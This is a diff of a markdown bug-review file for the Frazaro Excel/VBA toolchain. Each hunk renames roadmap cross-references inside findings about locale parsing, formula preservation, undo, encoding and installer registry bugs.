@@ -144,7 +144,7 @@ VlaSlabRead = src.Value            ' formulas read as their results
 ...
 destRange.Resize(nRows, nCols).Value = arr   ' every cell rewritten, touched or not
 ```
-- Failure scenario: `(for-each-row (row (range "A2:D100")) (set! (row 4) (* (row 4) 1.1)))` over a sheet where column C holds `=A2*B2`. After the loop, C2:C100 are frozen numbers. Later edits to A/B silently stop flowing. Both backends do the same, so parity tests pass. The design notes (ROADMAP1:9645-9680) never mention formulas.
+- Failure scenario: `(for-each-row (row (range "A2:D100")) (set! (row 4) (* (row 4) 1.1)))` over a sheet where column C holds `=A2*B2`. After the loop, C2:C100 are frozen numbers. Later edits to A/B silently stop flowing. Both backends do the same, so parity tests pass. The design notes (BETA_REARVIEW:9645-9680) never mention formulas.
 - Live repro: put `=A2*2` in B2:B5, run a for-each-row over A2:B5 that only changes column 1, then inspect B2 with `.HasFormula`.
 - Dedupe: searched for `for-each-row`, `VlaSlabWrite`, PF.4c. The design entry exists but formulas are not discussed.
 - Fix direction: read `.Formula` alongside `.Value` and write back only the columns (or cells) whose value changed, or refuse a range that `HasFormula` (a refusal in words). Cheapest: in `VlaSlabRead`, refuse when `src.HasFormula` is not `False`.
@@ -220,8 +220,8 @@ Public Sub VlaSlabWrite(ByRef arr As Variant, ByVal destRange As Range)
 ```
 - Failure scenario: With Windows regional settings set to German, the VLA `(+ 1.5 1)` compiles to VBA source `(1.5 + 1)`. VBA's own parser reads that invariantly as 2.5. The interpreter calls `CDbl("1.5")`, and in de-DE "." is the thousands separator, so that is 15 and the answer is 16. In en-US, an atom like `1d2` or `&h10` also passes `IsNumeric` and becomes 100 or 16. The English path emits literals such as `5%` → `(/ 5 100)`, so every decimal in an English program reaches this code.
 - Live repro: With the region set to German, run `eval "(+ 1.5 1)"` in the CLI, and Interpret `Put 1.5 into cell A1.`.
-- Dedupe: `BETA_ROADMAP1.md:12100-12105` notices this convention and explicitly declines to re-litigate it ("this interpreter's OWN pre-existing atom convention"), but no item was filed. It extends EN.4, which is scoped to the reader, not this backend.
-- Fix direction: Use the same `IsNumericLiteralText`/`Val` pair the expand-time code already uses (per BETA_ROADMAP1 ~11872).
+- Dedupe: `BETA_REARVIEW.md:12100-12105` notices this convention and explicitly declines to re-litigate it ("this interpreter's OWN pre-existing atom convention"), but no item was filed. It extends EN.4, which is scoped to the reader, not this backend.
+- Fix direction: Use the same `IsNumericLiteralText`/`Val` pair the expand-time code already uses (per BETA_REARVIEW ~11872).
 - Ratchet-able?: Yes. Grep the modules that handle source text for `CDbl(`/`IsNumeric(` applied to a variable that holds token text. The interpreter's atom path is the obvious first entry for the list.
 
 ### C6 — The SEC.4 formula-injection guard covers one shape of one sink; the compiled backend, cell-to-cell copies, array writes and Replace all skip it
@@ -273,7 +273,7 @@ AnonymousColumnVarName = anonPrefix & itemIndex & "C" & colIndex
 ```
 - Failure scenario: the anonymous name for an unmentioned column is built only from the prefix, the index of the *top-level* body item and the column position. Every keyed atom nested inside one `(if C T E)` therefore gets the same names. C and T run on one path, since the condition's bindings carry into the then-branch. So when C and T both leave column j unmentioned, they are forced to hold equal values in column j. Take the tables `Leave(name, shift, reason)` and `Staff(name, dept, level)` and this query: `(query (shifts (shift S)) (if (leave (shift S) (name W)) (staff (name W) (dept D)) (= D none)))`. Both `leave.reason` and `staff.level` become `VlaAnonQ3C3`, so the then-branch matches only when a person's level equals the text of their leave reason. That almost never happens. The condition has already committed, so the else-branch is skipped too, and the shift quietly drops out of the result. There is no refusal. Rule bodies are affected the same way (`VlaAnonB<bi>C<j>`, freshened per invocation, but still shared within one). So are `(not (if ...))`, `(findall T (if ...) B)` and `(or (if ...) ...)`.
 - Live repro: build the two Tables above so that the leave reasons are text and the levels are numbers. `=PROLOG("(query (leave (name W) (shift S)) (if (leave (shift S) (name W)) (staff (name W) (dept D)) (= D none)))", Leave, Staff)` returns no rows. Replacing the then-branch with its positional form `(staff W D L)` returns them.
-- Dedupe: I grepped "VlaAnon", "anonymous col", "keyed" and "if" in both roadmaps. The only hits are DATALOG.7, which is about a refusal *message* naming `VlaAnon...`, and ROADMAP1:8550, a test name. This is not filed.
+- Dedupe: I grepped "VlaAnon", "anonymous col", "keyed" and "if" in both roadmaps. The only hits are DATALOG.7, which is about a refusal *message* naming `VlaAnon...`, and BETA_REARVIEW:8550, a test name. This is not filed.
 - Fix direction: make the index unique per *keyed atom*, not per top-level item. For example, thread a ByRef counter through `DesugarBodyItem` and use `anonPrefix & itemIndex & "_" & atomSeq & "C" & j`. An alternative is a per-clause fresh counter.
 - Ratchet-able?: partly. A check could flag any recursive `DesugarBodyItem` call that passes the caller's `itemIndex` unchanged. A test is better: one keyed atom in each of C and T, each omitting the same column index.
 
@@ -352,7 +352,7 @@ UnifyTwoWay = (CStr(aw) = CStr(bw))   ' leaves compare as text
   - `(not (rates X 0.5))`, which keeps rows it should drop.
   - A grouping key that contains a fraction.
 - Live repro: on a German-locale Windows, make Table `rates` with columns Name|Rate and row a|0.5 (a real number cell). Enter `=DATALOG("(rule (half X) (rates X 0.5)) (query half)", rates)`.
-- Dedupe: PROLOG.18/PROLOG.30 ("CStr is locale-following, '0,5'", BETA_ROADMAP1 ~16589) fixed PROLOG's `is`, NumberToTerm and TableCellToTerm, and DATALOG.11 fixed text tests only. EN.4 covers the English reader, not engine tuple identity. Not filed for DATALOG matching or joins.
+- Dedupe: PROLOG.18/PROLOG.30 ("CStr is locale-following, '0,5'", BETA_REARVIEW ~16589) fixed PROLOG's `is`, NumberToTerm and TableCellToTerm, and DATALOG.11 fixed text tests only. EN.4 covers the English reader, not engine tuple identity. Not filed for DATALOG matching or joins.
 - Fix direction: build tuple keys and plan comparisons from one `ValueSpelling(v)`: `InvariantNumberText` for a real numeric VarType, `CStr` otherwise. Use it in TupleKey, PartialKey, PlanMatches, KeyFromPositions and SymClassOf/VlaSymIntern, so a Table 0.5 and a typed 0.5 share a spelling on every machine. This also changes SQL's DISTINCT/GROUP BY keys (finding 4); decide both together.
 - Ratchet-able: yes. Forbid bare `CStr(` on tuple data in VLA_Relation/VLA_Datalog key builders (the functions named above) and require the shared spelling helper.
 
@@ -472,7 +472,7 @@ End If
 ```
 - Failure scenario: A workbook has `Summary!B1 = SUM(Output!B:B)`, a defined name `Rates = Budget!$A$1:$A$12`, and a chart over `Budget`. The program says "Work on sheet Budget." and stops on line 5 (any refusal). U.25 calls `PutBackLastRun`. Renaming `Budget` to `VLAu_old` rewrites every dependant to `VLAu_old!...`. Deleting `VLAu_old` turns them all into `#REF!`. The restored copy named `Budget` is a different sheet object, so nothing re-points to it. The same happens to cross-sheet references inside the restored copy itself (`=Budget!A1` in a snapshot sheet follows the rename too). Excel's own Ctrl+Z cannot recover this, because a macro clears the undo stack. The user asked for "put it back" and got a workbook whose summary sheets are broken. Undo also renames tables on the copied sheet (`Table1` becomes `Table13`), which breaks structured references that point at them.
 - Live repro (for the owner): In a workbook, put `=Output!A1` on Sheet1. Write a program that puts 5 in A1 and then stops with a refusal (for example `Go to sheet Nowhere.` outside a Try). Interpret and Run. After the "put back" message, Sheet1!A1 reads `=#REF!A1`. Undo Last Run on a successful run gives the same result.
-- Dedupe: Grepped BETA_ROADMAP1/2 for `#REF`, `VLAu_old`, `undo.*formula`, `dependent`. U.19/U.21/U.23 fix *which* sheet gets renamed and rolled back, but none of them looks at references into the sheet being restored. Not filed.
+- Dedupe: Grepped BETA_REARVIEW/2 for `#REF`, `VLAu_old`, `undo.*formula`, `dependent`. U.19/U.21/U.23 fix *which* sheet gets renamed and rolled back, but none of them looks at references into the sheet being restored. Not filed.
 - Fix direction: Restore **contents** into the existing sheet object instead of replacing the object: clear it, then `snap.UsedRange.Copy orig.Range(same address)` or copy `.Formula`/`.Value` plus formats. Only a sheet the run *created* (tombstones) should be deleted. If a whole-sheet swap stays, refuse Undo when `orig` has dependants (scan `hb.Names`, and `Precedents` across sheets for formulas that mention `orig`) and say so in words.
 - Ratchet-able?: Partly. A static check could flag `.Name = ... & "old"` followed by `.Delete` on a user sheet. The real guard would be a host test: a sheet whose formula refers to Output survives Undo.
 
@@ -564,7 +564,7 @@ Private Sub mApp_SheetChange(ByVal Sh As Object, ByVal Target As Range)
 ```
 - Failure scenario: The program is `When the sheet changes: put the total of column D in B2.` The author meant the Output sheet, where every IDE run starts (:1340 `outWs.Activate`). After one Interpret the handler is armed. The user goes back to the "Frazaro" sheet and types a new sentence in B7. SheetChange fires, and the handler writes into **B2 of the Frazaro sheet**, replacing sentence 2. The program sheet is protected only during a run. Pressing Validate does the same thing: every `MarkOK` in column C fires the handler, and its write lands on the Frazaro sheet in the middle of the Check. "Interpret and Trace" writes one Trace cell per effect, so the handler runs once per trace line (a full recompile each time) against the Trace sheet. The handler also fires for writes to the very-hidden `VLA_Log`, while the active sheet belongs to the user.
 - Live repro: Use the program above. Interpret it, then type anything in B10 of the Frazaro sheet. B2 now holds a number.
-- Dedupe: BETA_ROADMAP1 (IN.7, around line 5025) records "fires for ANY sheet change anywhere in the registered WORKBOOK ... owner-confirmed harmless for now". That covers the trigger scope only. The *write target* (ActiveSheet, not Output and not `Sh`) and self-triggering by Frazaro's own IDE writes are not mentioned. This **extends IN.7's accepted scope note** and is not a re-report of it.
+- Dedupe: BETA_REARVIEW (IN.7, around line 5025) records "fires for ANY sheet change anywhere in the registered WORKBOOK ... owner-confirmed harmless for now". That covers the trigger scope only. The *write target* (ActiveSheet, not Output and not `Sh`) and self-triggering by Frazaro's own IDE writes are not mentioned. This **extends IN.7's accepted scope note** and is not a re-report of it.
 - Fix direction: Hand `Sh`/`Target` to the dispatcher. Skip changes on Frazaro's own sheets (`IsFrazaroSheetName`, :2712 already exists). Run the handler against a fixed sheet: activate Output, or bind `(range ...)` to an explicit sheet the way `InterpretProgram` intends. Combine this with the EnableEvents bracket from finding 2 around every IDE write.
 - Ratchet-able?: Partly. A check can require that a `mApp_SheetChange` body forwards `Sh`. The IDE-write bracket can be ratcheted the same way as in finding 2.
 
@@ -646,7 +646,7 @@ End Function
 ```
 - Failure scenario: the tokenizer makes `1.5` a single token (:3316). Whether `Set x to 1.5.` translates then depends on the Windows locale. Where "." is neither the decimal nor the group separator (fr-FR style), `IsNumeric("1.5")` is False. The token is also not a word token (it starts with a digit), so the sentence gets a wrong refusal ("expected a value"). The rule also accepts, on every locale, tokens that no backend reads the same way. `Set x to 5-.` gives token `5-`, which `IsNumeric` accepts (trailing sign). The translator emits `(set! x 5-)`. The interpreter's `IsNumeric/CDbl` reads that as -5, while compiled VBA `x = 5-` is a syntax error. `1d3` and `1e3` also pass as "numbers".
 - Live repro: set Windows Region to French (France), then Check `Set x to 1.5. Show x.` Next, on en-US, check `Set x to 5-. Show x.` on both backends.
-- Dedupe: EN.4 ("decimal and thousands separators in the reader") is open and is the umbrella, so this **extends EN.4**. The site itself (IsNumTok) is named nowhere in either roadmap. BETA_ROADMAP1 ~L11748 flags IsNumeric in VLA.bas FormulaQuote, not here.
+- Dedupe: EN.4 ("decimal and thousands separators in the reader") is open and is the umbrella, so this **extends EN.4**. The site itself (IsNumTok) is named nowhere in either roadmap. BETA_REARVIEW ~L11748 flags IsNumeric in VLA.bas FormulaQuote, not here.
 - Fix direction: set `IsNumTok = IsInvariantNumeral(t)`, which the tokenizer's own number shape already satisfies (digits, one ".", leading "-"). Then fold the three twin classifiers (IsInvariantNumeral, VLA.IsNumericLiteralText, VLA_Relation.IsInvariantNumericString) into one.
 - Ratchet-able?: yes. `check_translate_purity.ps1` (or a new check) could ban `IsNumeric(`, `CDbl(`, `CStr(` and `LCase$`/`UCase$` in the translate-path modules, with a reviewed allow-list. Today no tools/check_*.ps1 greps for any of them (verified), even though R6 (REBUILD.md:151) says "a lint can now grep for zero hits".
 
@@ -688,7 +688,7 @@ outVal = "{" & slotName & "}"        ' unbound: kept verbatim, no refusal
 ```
 - Failure scenario: `(english-vla "set {Total:var} to {e:expr}" (set! {Total} {e}))`. The pattern slot is folded to `total` and the template keeps `{Total}`, so every match emits `(set! {Total} 5)`. The same thing happens for any typo (`{ex}` for `{e}`). The error surfaces later as a confusing reader/VBA failure, or not at all if the brace atom ends up inside a string (`"Hello {nmae}"` renders literally). The reverse case is also unchecked: a pattern slot the template never uses silently discards the words the user wrote. A test-success proof catches this only if the author wrote one for that exact rule.
 - Live repro: Explain `Set total to 5.` after loading the rule above and read the VLA line.
-- Dedupe: searched both roadmaps for "undeclared slot", "unbound slot" and "template … slot". The only hit (ROADMAP1 ~L21242) concerns VLA_Messages slots (check_message_slots.ps1), not phrase templates. Not filed.
+- Dedupe: searched both roadmaps for "undeclared slot", "unbound slot" and "template … slot". The only hit (BETA_REARVIEW ~L21242) concerns VLA_Messages slots (check_message_slots.ps1), not phrase templates. Not filed.
 - Fix direction: in AddPhraseRule, collect the template's `{x}`/embedded slot names (Fold-ed) and refuse any name not bound by the pattern, including the generated `-rules`/`-engine` companions. Lint-warn on pattern slots that the template never uses. Fold slot names on both sides.
 - Ratchet-able?: a load-time refusal closes the class. `check_message_slots.ps1` is the model for an offline twin over `scripts/**/*.vla`.
 
@@ -756,7 +756,7 @@ ElseIf c = "(" Then ... head = Mid$(vlaText, j, h - j) ...
 ```
 - Failure scenario: a raw row `(if (> x 1)   ; was (vla-old-helper x)` followed by `(then (msgbox "big")))`. Check refuses with "this program needs a helper named 'vla-old-helper' that this Frazaro doesn't provide". That is wrong, because the name is only mentioned in a comment. It fails the other way too (fail-open): an odd number of `"` in a comment flips `inLit`, so the rest of the program is treated as string and a real missing helper passes the check.
 - Live repro: put the two-line raw row above in an instruction cell and click Check.
-- Dedupe: EnglishResolveCheck appears in ROADMAP1 L3930/3937/5567 and ROADMAP2 F.16 only as a mechanism, with no comment bug. Tests (VLA_Tests.bas:5467-5483) cover string literals, not comments. Not filed.
+- Dedupe: EnglishResolveCheck appears in BETA_REARVIEW L3930/3937/5567 and BETA_ROADMAP F.16 only as a mechanism, with no comment bug. Tests (VLA_Tests.bas:5467-5483) cover string literals, not comments. Not filed.
 - Fix direction: add a `;`-to-end-of-line branch outside literals (the same one VocabTextHasRawForm :8344 already has), or scan the reader's forms instead of raw text.
 - Ratchet-able?: the class is "hand-rolled VLA text scanners that miss a lexical case". There are at least three in this file (EnglishResolveCheck, VocabTextHasRawForm, EnTokenize's raw capture), and one handles `;` while another does not. Converging on one shared lexer is the fix. A pin covering comment plus odd quote would hold it.
 
@@ -778,7 +778,7 @@ ansiFallback:
 ```
 - Failure scenario: (a) With no ADODB (Mac, where EN.6 says the default runtime now runs, or a locked-down Windows image), `CreateObject` fails, so the fallback decodes a UTF-8 program as cp1252/MacRoman. `Show "Café"` then writes `CafÃ©` into the workbook with no error. A UTF-8 BOM becomes `ï»¿`, and the tokenizer refuses line 1 with "I don't understand the character ï". (b) With ADODB present, a legacy ANSI-saved file containing `é` "succeeds" as UTF-8 with U+FFFD in place of the byte, which is also silent. U.20/TER-6 made every writer byte-honest. The readers are still lossy.
 - Live repro: (a) on Windows, temporarily make CreateObject fail (for example, rename the ProgID in a scratch copy, or test on Mac Excel) and translate a program containing `"Café"`. (b) Save a program as ANSI in Notepad with `"Café"` and run Translate to VLA, then inspect the output.
-- Dedupe: U.20, TER-5 and TER-6 are all about writers. VocabReadFile is mentioned only at ROADMAP1 L10659 (the purity audit). Searched StrConv, mojibake and "ANSI" in ROADMAP2. Not filed.
+- Dedupe: U.20, TER-5 and TER-6 are all about writers. VocabReadFile is mentioned only at BETA_REARVIEW L10659 (the purity audit). Searched StrConv, mojibake and "ANSI" in BETA_ROADMAP. Not filed.
 - Fix direction: read bytes once (VlaReadFileBytes), strip a BOM, decode with VlaUtf8Decode, and refuse in words with the byte offset when `badAt` is set. Delete both ANSI fallbacks and the cached `mVocabStream`.
 - Ratchet-able?: yes. Ban `StrConv(` with `vbUnicode` and `ADODB.Stream` reads outside one sanctioned reader.
 
@@ -800,7 +800,7 @@ ansiFallback:
   In the golden, main runs steps 348-358 and roughly 593-687 with no handler at all. The next `On Error GoTo vla_fail` is only re-issued by a later Try's restore (golden:2049).
 - Failure scenario: (a) Any sentence that fails after `Show all rows.` in a compiled program shows VBA's raw "Run-time error 1004" dialog with **Debug**/**End**, instead of `vla_report_error`'s worded step report. `VlaStopReport` (U.25) records nothing. If the person presses End, VBA state resets and the Run button's own clean-up after `Application.Run` never runs. (b) `Try:` / `Show all rows.` / `Delete sheet Old.` / `If that fails: ...`: the delete failure is **not** caught by the Try on either backend. The interpreter mirrors this too: `ExecOnError` sets `mErrMode = ""` (Interpreter:827). (c) Nested Try: after an inner Try completes, the outer Try's handler is replaced by `vla_fail`, so later failures in the outer body stop the run instead of reaching the outer recovery paragraph. The comment at SentenceEngine:684 claims nested Trys are supported.
 - Live repro: compile a program with `Show all rows.` followed by `Put 1 into cell A1 of sheet Nope.` and press Run. Expected: a worded stop at that step. Predicted: raw VBE error dialog.
-- Dedupe: searched for `showalldata`, `show-all-rows`, "goto 0", "nested try". Only CO.7 wording notes (ROADMAP1:7299/7312) came up, nothing about the handler. The prelude's own comment (prelude.vla:169-173) documents the physics for `try-else`/`with-fast-excel`, but no shipped English rule is supposed to hit it, and `show-all-rows` does. TER-11 is a different mechanism (a sub's handler returning).
+- Dedupe: searched for `showalldata`, `show-all-rows`, "goto 0", "nested try". Only CO.7 wording notes (BETA_REARVIEW:7299/7312) came up, nothing about the handler. The prelude's own comment (prelude.vla:169-173) documents the physics for `try-else`/`with-fast-excel`, but no shipped English rule is supposed to hit it, and `show-all-rows` does. TER-11 is a different mechanism (a sub's handler returning).
 - Fix direction: have the English layer emit `RestoreHandlerVla()` after any statement whose expansion contains `on-error`. Or move the probe into a `VLA_Runtime` helper, `VlaShowAllData`, which uses On Error inside its own procedure. That is the pattern `MakeButtonHelperText` already uses (VLA.bas:5768 comment). For nested Try, restore to the enclosing Try's `vla-tryf-N` when there is one, using a stack in the parser.
 - Ratchet-able?: Yes. Scan the committed golden `.vba`: inside any procedure containing `On Error GoTo vla_fail`, every `On Error GoTo 0` / `On Error Resume Next` must be followed by `On Error GoTo vla_fail|vla_tryf_N` before the next `vla_step =` line. That would have caught all 6 golden instances.
 
@@ -817,7 +817,7 @@ r = Replace(Replace(TransliterateToAscii(s), "-", "_"), ":", "_")
 ```
 - Failure scenarios: (a) `Create a number called résumé.` passes `CheckName`, because "résumé" is not in the list, and is then emitted as `Dim resume As Double`. `Resume` is a VBA keyword, so this is a compile error. The same happens with `dáte`, `nëxt`, `sélect`, `énd`. (b) `x²`/`x₁` and `x` fold to the same `x`, and so do `café` and `cafe`, and `row-count` and `row_count`. The interpreter keeps them distinct: `VLA_Identity.Fold` only lower-cases A-Z (VLA_Identity.bas:46). VBA sees one name: a duplicate declaration, or a local silently shadowing a module-level `Const` or `Dim`. (c) `Émile` and `émile` are two names to the interpreter, because Fold is ASCII-only. After transliteration they are `Emile`/`emile`, which is one name to case-insensitive VBA. (d) `IsReservedName`'s list itself is missing real VBA keywords: `return`, `gosub`, `global`, `addressof`, `decimal`, `longlong`, `longptr`, `attribute`. `Create a number called return.` (an investment "return") is refused by nothing. (e) The emitter's own names (`vla_step`, `vla_problem`, `vla_fail`, `vla_report_error`, `vla_step_text`, `vla_tco_N`, `vlaSlab*`) are not refused as user names. `RefuseGeneratedPrefix` covers relations only.
 - Live repro: `Create a number called résumé.` / `Set résumé to 1.` Interpret works. Compile shows "Expected: identifier" (or similar) in the VBE.
-- Dedupe: LX.6 (ROADMAP1:4013) decided to transliterate but says nothing about collisions or reserved words. `IsReservedName` appears only in LX.1 ("keep"). The click-handler slug already has this exact collision guard (`english-click-handler-slug-collision`, SentenceEngine:634-660), which shows the class is known but only closed for one path.
+- Dedupe: LX.6 (BETA_REARVIEW:4013) decided to transliterate but says nothing about collisions or reserved words. `IsReservedName` appears only in LX.1 ("keep"). The click-handler slug already has this exact collision guard (`english-click-handler-slug-collision`, SentenceEngine:634-660), which shows the class is known but only closed for one path.
 - Fix direction: give SymName (or a per-transpile registry) a "mangled name → first raw name" map that refuses a second, different raw name with the same mangled form. Run the reserved-word check **after** mangling, in the emitter, against one authoritative list (MS-VBAL keywords plus the emitter's reserved prefix `vla_`).
 - Ratchet-able?: partly. A static check can require that `IsReservedName`'s list is a superset of a checked-in MS-VBAL keyword file. Injectivity needs the runtime registry.
 
@@ -853,10 +853,10 @@ Private Function ToVbaString(ByVal tok As String) As String
     c = Mid$(tok, 2)
     ToVbaString = """" & Replace(c, """", """""") & """"   ' no vbLf/vbCr handling, no splitting
 ```
-- Failure scenario: (a) The VLA source `(debug-print "a` / `b")`, legal to the reader and fine in the interpreter, emits a VBA string literal spanning two physical lines, which is a syntax error. `MapTag` (VLA.bas:4275) then inserts `' vla:N` *inside* the string at the first vbCrLf. (b) A sentence or formula longer than about 1000 characters (Excel formulas can be up to 8192) produces an emitted line past the VBE's 1023-character physical line limit, both in the statement and again in `vla_step_text`. The roadmap (ROADMAP1:16702) records that limit biting Frazaro's own source, but the emitter has no guard.
+- Failure scenario: (a) The VLA source `(debug-print "a` / `b")`, legal to the reader and fine in the interpreter, emits a VBA string literal spanning two physical lines, which is a syntax error. `MapTag` (VLA.bas:4275) then inserts `' vla:N` *inside* the string at the first vbCrLf. (b) A sentence or formula longer than about 1000 characters (Excel formulas can be up to 8192) produces an emitted line past the VBE's 1023-character physical line limit, both in the statement and again in `vla_step_text`. The roadmap (BETA_REARVIEW:16702) records that limit biting Frazaro's own source, but the emitter has no guard.
 - Live repro: `Put formula "=<1100-character formula>" into cell A1.`, then Compile.
 - Dedupe: searched for "multi-line string", "ToVbaString", "1023". Only the VLA_Messages source-line instance came up.
-- Fix direction: in `ToVbaString`, emit `" & vbLf & "` for LF, `vbCr` for CR, and `ChrW(n)` for code points outside ASCII (this also fixes the ANSI-code-page `?` loss the roadmap notes at ROADMAP1:7018). Split any piece over about 900 characters into `"..." & _` continuations, or into several `s = s & ...` statements.
+- Fix direction: in `ToVbaString`, emit `" & vbLf & "` for LF, `vbCr` for CR, and `ChrW(n)` for code points outside ASCII (this also fixes the ANSI-code-page `?` loss the roadmap notes at BETA_REARVIEW:7018). Split any piece over about 900 characters into `"..." & _` continuations, or into several `s = s & ...` statements.
 - Ratchet-able?: yes. A check over the golden `.vba` can assert that no physical line exceeds 1023 characters and that no line has an unbalanced quote count.
 
 ### C31 — `(include "…")` files are read as ANSI, resolved against ActiveWorkbook, and a UTF-8 BOM breaks them
@@ -876,7 +876,7 @@ If LOF(fnum) > 0 Then ReadIncludeFile = Input$(LOF(fnum), #fnum)
 ```
 - Failure scenario: every other `.vla` reader decodes UTF-8 (`VlaReadFile`; see the TER-6 note at SentenceEngine:10440). An included UTF-8 file containing `"café"` puts `cafÃ©` into cells, silently. If the include was saved with a BOM (Notepad), the first three characters `ï»¿` become a bare symbol token before the first `(`, and the whole program is refused as "top-level not a list". Relative includes resolve against whichever workbook is **active**, not against the including file's folder, so nested `lib/a.vla` → `(include "b.vla")` misses. On a DBCS code page, `Input$(LOF)` counts characters against a byte length and can raise error 62.
 - Live repro: save `inc.vla` as UTF-8 with a BOM containing `(sub helper () (debug-print "café"))`, and `(include "inc.vla")` it from a program.
-- Dedupe: searched for `ReadIncludeFile`, "include.*UTF-8/ANSI/BOM". The only hit (ROADMAP1:2909) is F.3's design note. EN.9 covers OneDrive `.Path` generally, not the encoding.
+- Dedupe: searched for `ReadIncludeFile`, "include.*UTF-8/ANSI/BOM". The only hit (BETA_REARVIEW:2909) is F.3's design note. EN.9 covers OneDrive `.Path` generally, not the encoding.
 - Fix direction: read through `VLA_Loader.VlaReadFileBytes` plus `VlaUtf8Decode` (strict, with the BOM stripped, as Lint does at VLA_Lint.bas:835-838), and resolve relative to the including file's directory. That directory is already known as `label` in `SpliceWalk`.
 - Ratchet-able?: yes. A grep ratchet for `Open .* For Input` on `.vla` sources outside `VLA_Loader`.
 
@@ -937,7 +937,7 @@ Private Function SymName(ByVal s As String) As String
         SymName = s      ' copied verbatim into VBA source
 ```
 - Failure scenario (en-US, no locale change needed): the reader keeps `1,000` as one atom, because the tokenizer only splits on space, parens, `;` and `"`. `IsNumeric("1,000")` is True, so `(f 1,000)` emits `f(1,000)`, which VBA reads as **two** arguments. The interpreter's `CDbl("1,000")` is 1000. In a quote, `(quote (1,000 2))` emits `Array(1,000, 2)`, three elements, and deflambda's `{1,000,2}` likewise. `$5` → `IsNumeric` True → emitted `$5` → syntax error. On a de-DE machine, `IsNumeric("1.5")` is True and the interpreter's `CDbl("1.5")` = 15 while compiled VBA sees `1.5`. INTRINSICS #2 names this exact rule, and `IsNumericLiteralText` (VLA.bas:3791) already exists.
-- Dedupe: EN.4 ("separators in the reader", ROADMAP1:5775) is an open placeholder with no site list, and ROADMAP1:11748-11843 notes `FormulaQuote`'s `IsNumeric` in passing. This entry adds the arity-shift failure and the five exact sites. It is a **ratchet blind spot**: no `tools/check_*.ps1` enforces INTRINSICS #2.
+- Dedupe: EN.4 ("separators in the reader", BETA_REARVIEW:5775) is an open placeholder with no site list, and BETA_REARVIEW:11748-11843 notes `FormulaQuote`'s `IsNumeric` in passing. This entry adds the arity-shift failure and the five exact sites. It is a **ratchet blind spot**: no `tools/check_*.ps1` enforces INTRINSICS #2.
 - Fix direction: route all five sites through `IsNumericLiteralText`, and `Val` where a number is needed.
 - Ratchet-able?: yes. A grep ratchet with a ceiling on `IsNumeric(`/`CDbl(` in VLA.bas and VLA_Interpreter.bas (current count 3 + 2 on atom text).
 
@@ -1111,7 +1111,7 @@ ElseIf headWord = "not" Then
 ```
 - Failure scenario: `(query (not (leave (name W))) (staff (name W)))` is the README policy with its goals in the wrong order. At the `not`, W is free, so the goal means "is anyone on leave". If anyone is, the whole roster is empty. Standard Prolog does the same (NAF is unsound on non-ground goals), so this is not an ISO deviation. But DATALOG refuses the same shape (stratified safety), and this module's doctrine repeatedly ranks silent wrong answers below refusals.
 - Live repro: the README example with the `not` moved before the `staff` conjunct returns no rows when the Leave Table is non-empty.
-- Dedupe: I grepped "flounder", "unsafe", "goal order" and "negat… unbound". Not filed. The ROADMAP1:18280 hit is DATALOG.
+- Dedupe: I grepped "flounder", "unsafe", "goal order" and "negat… unbound". Not filed. The BETA_REARVIEW:18280 hit is DATALOG.
 - Fix direction: add a static check per clause and per query. When a variable occurs inside a `not` goal and also in a *later* conjunct of the same clause or query, but in no earlier one, refuse by name ("bind W before the not"). Variables local to the `not` stay legal.
 - Ratchet-able?: no; it is a parse-time check plus a test.
 
@@ -1222,7 +1222,7 @@ ElseIf headWord = "not" Then
   The memo header (403-421) states the invariant: "the memo may only make an answer FASTER and may never change what it is." ChoiceGuardWords itself says the guard is "the one stop that depends on the machine."
 - Failure scenario: a formula whose search normally finishes in about 3-6 s is first calculated while the machine is loaded, for example on workbook open with other UDFs recalculating, antivirus running, or a laptop on battery. The 10 s guard fires. That result is memoized under the content key and the cell spills the empty "no schedule" shape. For the rest of the session, F9, Ctrl+Alt+F9, re-entering the formula and every OPTIMIZE_STATUS/OPTIMIZE_VIOLATIONS cell over the same arguments all return the memo instantly. Each still says "the search was stopped after 10.x seconds by the guard" even though no search ran. The answer only changes after the rules or Tables are edited or the VBA project is reset, and then it becomes a found schedule. So the memo does change what the answer is, which is the invariant it exists to keep. It also defeats the retry the guard's own words suggest.
 - Live repro: a roster that takes about 6-8 s at `(effort thorough)` or a large effort number. Throttle the CPU (a busy-loop in another process, or power-saver mode) and enter the formula: the status shows the guard. Remove the throttle and press Ctrl+Alt+F9: the status still shows the guard and the recalc is instant. Then run `VLA_Optimize.OptimizeMemoClear` and recalc: a schedule appears.
-- Dedupe: I grepped BETA_ROADMAP1/2 and OPTIMIZATION.md for "memo" combined with "guard"/"seconds". The memo is discussed for refusals (a refusal is never memoized, the size refusal is the exception, ROADMAP1 22298-22305) and for the key's cost (OPTIMIZATION.md 1318). Nothing covers memoizing a machine-dependent outcome. Not filed.
+- Dedupe: I grepped BETA_REARVIEW/2 and OPTIMIZATION.md for "memo" combined with "guard"/"seconds". The memo is discussed for refusals (a refusal is never memoized, the size refusal is the exception, BETA_REARVIEW 22298-22305) and for the key's cost (OPTIMIZATION.md 1318). Nothing covers memoizing a machine-dependent outcome. Not filed.
 - Fix direction: skip MemoPut when the item-9 stats say the search outcome was OPT_SEARCH_GUARD (`result.Item(9)(6) = 4`). A guard stop is as cheap to recompute as it was to find, and it is the only outcome that is not a function of the key.
 - Ratchet-able?: a pure pin is enough. Pass guardSeconds through a test seam (or set effort huge and guard tiny), run twice, and require OptimizeMemoRuns to move by 2. A static rule cannot see this.
 
@@ -1332,7 +1332,7 @@ if RegQueryStringValue(HKCU, OptKey, OpenSlotName(I), Existing) then
   - Secondary: deleting slot `OPEN` while `OPEN1` (another vendor's add-in) remains leaves a gap. Whether Excel stops enumerating at the first gap needs checking live. If it does, uninstalling Frazaro unloads someone else's add-in.
   - Tertiary: on a machine where Excel has never written `Excel\Options`, `GetOfficeExcelVersions` returns nothing. Registration silently does nothing while POST_INSTALL.txt says "Frazaro is installed and registered with Excel."
 - Live repro: install to a profile with a space in the path, open Excel, untick and re-tick Frazaro in the Add-ins dialog, close Excel, and inspect `HKCU\Software\Microsoft\Office\16.0\Excel\Options` (quoted?). Then uninstall and relaunch Excel. For the gap question: register a dummy add-in in OPEN1, uninstall Frazaro from OPEN, relaunch, and check `Application.AddIns`.
-- Dedupe: grepped both roadmaps for `OPEN`, `quot`, `UninstallDelete`. BETA_ROADMAP1.md:2080-2084 (SIG.1 write-up, "none minted") notes that the consent records under `HKCU\Software\VB and VBA Program Settings\Frazaro` survive uninstall. That is a different leftover and was also never filed. DEPLOY.md:103-110 records a live install → uninstall run that did not toggle the add-in in between. Not filed.
